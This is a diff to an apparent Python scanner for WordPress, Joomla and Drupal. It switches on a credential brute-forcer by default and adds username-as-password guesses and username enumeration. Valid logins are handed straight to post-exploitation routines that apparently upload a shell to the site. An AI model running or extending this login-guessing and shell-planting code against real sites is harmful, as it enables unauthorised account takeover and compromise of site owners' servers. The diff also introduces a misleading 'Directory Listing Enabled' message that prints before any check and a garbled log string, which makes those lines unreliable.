@@ -226,7 +226,7 @@ class WPScan:
         self.feed = "/?feed=rss2"
         self.author = "/?author="
         self.forgottenPsw = "/wp-login.php?action=lostpassword"
-        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
+        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username
         self.usernames = []
         self.pluginsFound = []
         self.themesFound = []
@@ -247,7 +247,7 @@ class WPScan:
         self.WPHello()
         self.WPFeed()
         self.WPAuthor()
-        #BruteForcer(self.url,self.usernames,self.weakpsw).WPrun()
+        BruteForcer(self.url,self.usernames,self.weakpsw).WPrun()
         self.WPForgottenPassword()
         GenericChecks(self.url).AutocompleteOff('/wp-login.php')
         self.WPDefaultFiles()
@@ -294,11 +294,12 @@ class WPScan:
             htmltext = urllib2.urlopen(req).read()
             regex = '/wp-content/themes/(.+?)/'
             pattern =  re.compile(regex)
-            version = re.findall(pattern,htmltext)[0]
-            if version:
-                msg = "[*] Wordpress Theme: "+version ; print msg
+            CurrentTheme = re.findall(pattern,htmltext)[0]
+            if CurrentTheme:
+                self.theme = CurrentTheme
+                msg = "[*] Wordpress Theme: "+self.theme ; print msg
                 if output : report.WriteTextFile(msg)
-                ExploitDBSearch(self.url, 'Wordpress', [version]).Themes()
+                ExploitDBSearch(self.url, 'Wordpress', [self.theme]).Themes()
         except urllib2.HTTPError, e:
             #print e.code
             pass
@@ -411,6 +412,8 @@ class WPScan:
             pass
 
     def WPDirsListing(self):
+        msg = "[-] Directory Listing Enabled ..."; print msg
+        if output : report.WriteTextFile(msg)
         GenericChecks(self.url).DirectoryListing('/wp-content/')
         GenericChecks(self.url).DirectoryListing('/wp-content/'+self.theme)
         GenericChecks(self.url).DirectoryListing('/wp-includes/')
@@ -504,7 +507,7 @@ class JooScan:
         self.pluginPath = "/components/"
         self.pluginsFound = []
         self.notExistingCode = 404
-        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
+        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username 
         self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
         self.plugins = [line.strip() for line in open('joomla_plugins.txt')]
         self.versions = [line.strip() for line in open('joomla_versions.txt')]
@@ -620,6 +623,8 @@ class JooScan:
             pass 
         
     def JooDirsListing(self):
+        msg = "[-] Directory Listing Enabled ..."; print msg
+        if output : report.WriteTextFile(msg)
         GenericChecks(self.url).DirectoryListing('/administrator/')
         GenericChecks(self.url).DirectoryListing('/bin/')
         GenericChecks(self.url).DirectoryListing('/cache/')
@@ -676,7 +681,7 @@ class DruScan:
         self.notExistingCode = 404
         self.pluginPath = "/modules/"
         self.forgottenPsw = "/?q=user/password"
-        self.weakpsw = ['password', 'admin','123456','abc123','qwerty']
+        self.weakpsw = ['password', 'admin','123456','Password1'] # 5th attempt is the username
         self.plugins = [line.strip() for line in open('drupal_plugins.txt')]
         self.versions = [line.strip() for line in open('drupal_versions.txt')]
         self.confFiles=['','.php~','.php.txt','.php.old','.php_old','.php-old','.php.save','.php.swp','.php.swo','.php_bak','.php-bak','.php.original','.php.old','.php.orig','.php.bak','.save','.old','.bak','.orig','.original','.txt']
@@ -850,6 +855,8 @@ class DruScan:
             pass
 
     def DruDirsListing(self):
+        msg = "[-] Directory Listing Enabled ..."; print msg
+        if output : report.WriteTextFile(msg)
         GenericChecks(self.url).DirectoryListing('/includes/')
         GenericChecks(self.url).DirectoryListing('/misc/')
         GenericChecks(self.url).DirectoryListing('/modules/')
@@ -1010,13 +1017,14 @@ class BruteForcer:
         def WPrun(self):
             self.wplogin = "/wp-login.php"
             self.WPValidCredentials = []
+            usersFound = []
             for user in self.usrlist:
-                userFound = False
                 cookieJar = cookielib.CookieJar()
                 cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
                 opener = urllib2.build_opener(cookieHandler)
                 opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
                 cookieJar.clear()
+                self.pswlist.append(user) # try username as password
                 for pwd in self.pswlist:
                     query_args = {"log": user ,"pwd": pwd, "wp-submit":"Log+In"}
                     data = urllib.urlencode(query_args)
@@ -1032,7 +1040,7 @@ class BruteForcer:
                                 if output : report.WriteTextFile(msg)
                             break
                         elif re.search('username <strong>(.+?)</strong> is incorrect.',htmltext):
-                            userFound = True
+                            usersFound.append(user)
                         elif re.search('ERROR.*block.*',htmltext,re.IGNORECASE):
                             msg = "[!] Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"; print msg
                             if output : report.WriteTextFile(msg)
@@ -1044,9 +1052,12 @@ class BruteForcer:
                     except urllib2.HTTPError, e:
                         #print e.code
                         pass
-                if userFound:
-                    msg = "[*] Username found: "+user; print_yellow(msg)
-                    if output : report.WriteTextFile(msg)
+                self.pswlist.pop() # remove user
+            msg = "[-] Valid Usernames found: "; print msg
+            if output : report.WriteTextFile(msg)
+            for userf in (sorted(set(usersFound))):
+                msg = userf; print_yellow(msg)
+                if output : report.WriteTextFile(msg)
             for WPCredential in self.WPValidCredentials :
                 PostExploit(self.url).WPShell(WPCredential[0], WPCredential[1])
            
@@ -1064,7 +1075,7 @@ class BruteForcer:
                 htmltext = opener.open(self.url+self.joologin).read()
                 reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
                 token = reg.search(htmltext).group(1)
-                
+                self.pswlist.append(user) # try username as password
                 for pwd in self.pswlist:
                     # Send Post With Token and Session Cookie
                     query_args = {"username": user ,"passwd": pwd, "option":"com_login","task":"login",token:"1"}
@@ -1079,6 +1090,7 @@ class BruteForcer:
                     except urllib2.HTTPError, e:
                         #print e.code
                         pass
+                self.pswlist.pop() # remove user
             for JooCredential in self.JooValidCredentials :
                 PostExploit(self.url).JooShell(JooCredential[0], JooCredential[1])
 
@@ -1086,6 +1098,7 @@ class BruteForcer:
             self.drulogin = "/?q=user/login"
             self.DruValidCredentials = []
             for user in self.usrlist:
+                self.pswlist.append(user) # try username as password
                 for pwd in self.pswlist:
                     query_args = {"name": user ,"pass": pwd, "form_id":"user_login"}
                     data = urllib.urlencode(query_args)
@@ -1103,7 +1116,8 @@ class BruteForcer:
                         if e.code == 403:
                             msg = "[*] Valid Credentials: "+user+" "+pwd; print_red(msg)
                             if output : report.WriteTextFile(msg)
-                            self.DruValidCredentials.append([user,pwd]) 
+                            self.DruValidCredentials.append([user,pwd])
+                self.pswlist.pop() # remove user
             for DruCredential in self.DruValidCredentials :
                 PostExploit(self.url).DruShell(DruCredential[0], DruCredential[1])
               
@@ -1125,7 +1139,7 @@ class PostExploit:
         try: 
             # Login in WordPress - HTTP Post
             if verbose : 
-                msg ="[-] Logging in on the target website ..."; print msg
+                msg ="[-] Logging in to on the target website ..."; print msg
                 if output : report.WriteTextFile(msg)
             opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
             # Request WordPress Plugin Upload page
@@ -1162,7 +1176,7 @@ class PostExploit:
         
         try:
             # HTTP POST Request
-            if verbose : print "[-] Logging in on the target website ..."
+            if verbose : print "[-] Logging in to the target website ..."
             opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
             
             if verbose : print "[-] Looking for Theme Editor Page on the target website ..."
@@ -1256,12 +1270,12 @@ class PostExploit:
         
         try:
             # HTTP POST Request
-            if verbose : print "[-] logging in on the target website ..."
+            if verbose : print "[-] Logging in to the target website ..."
             # Get Token and Session Cookie
             htmltext = opener.open(self.url+self.joologin).read()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
             token = reg.search(htmltext).group(1)            
-            # logging in on the website with username and password
+            # Logging in to the website with username and password
             query_args = {"username": user ,"passwd": password, "option":"com_login","task":"login",token:"1"}
             data = urllib.urlencode(query_args)
             htmltext = opener.open(self.url+self.joologin, data).read()
@@ -1377,7 +1391,7 @@ class GenericChecks:
             htmltext = urllib2.urlopen(req).read()
             dirList = re.search("<title>Index of", htmltext,re.IGNORECASE)
             if dirList: 
-                msg = "[*] Directory Listing Enabled: "+self.url+self.relPath ; print msg
+                msg = "\t"+self.url+self.relPath ; print msg
                 if output : report.WriteTextFile(msg)
         except urllib2.HTTPError, e:
             pass
